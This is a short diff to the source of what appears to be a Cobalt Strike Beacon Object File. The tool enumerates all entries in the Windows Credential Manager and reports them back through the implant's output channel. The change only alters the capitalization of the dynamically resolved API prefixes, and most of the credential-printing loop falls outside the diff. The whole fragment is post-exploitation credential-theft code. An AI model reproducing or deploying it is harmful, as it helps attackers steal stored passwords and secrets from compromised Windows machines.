@@ -8,12 +8,12 @@ void go() {
     DWORD count;
     PCREDENTIALW * creds;
 
-    if (!Advapi32$CredEnumerateW(NULL, 0, &count, &creds)) {
-        if (Kernel32$GetLastError() == 1168) {
+    if (!ADVAPI32$CredEnumerateW(NULL, 0, &count, &creds)) {
+        if (KERNEL32$GetLastError() == 1168) {
             BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Credential Manager empty.");
             return;
         } else {
-            BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Could not enumerate credentials. Error code: %d\n", Kernel32$GetLastError());
+            BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Could not enumerate credentials. Error code: %d\n", KERNEL32$GetLastError());
             return;
         }
     }
@@ -26,6 +26,6 @@ void go() {
         BeaconPrintf(CALLBACK_OUTPUT,"\n");
     }
     if (creds) {
-        Advapi32$CredFree(creds);
+        ADVAPI32$CredFree(creds);
     }
 }
